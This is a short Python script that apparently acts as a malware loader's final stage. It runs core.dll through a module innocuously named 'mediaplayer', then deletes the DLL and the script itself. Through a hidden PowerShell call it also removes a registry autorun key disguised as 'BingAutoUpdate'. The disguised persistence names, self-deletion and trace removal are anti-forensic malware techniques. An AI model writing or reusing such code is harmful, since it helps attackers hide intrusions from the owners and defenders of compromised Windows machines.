import subprocess
import os

directory = os.path.dirname(os.path.abspath(__file__))
target = directory + "\\core.dll"

module = __import__("mediaplayer")
if module.run(target) == True:
    os.remove(target)
    os.remove(__file__)
    subprocess.Popen(["powershell", "Remove-ItemProperty", "-Path", "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "-Name", "BingAutoUpdate"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
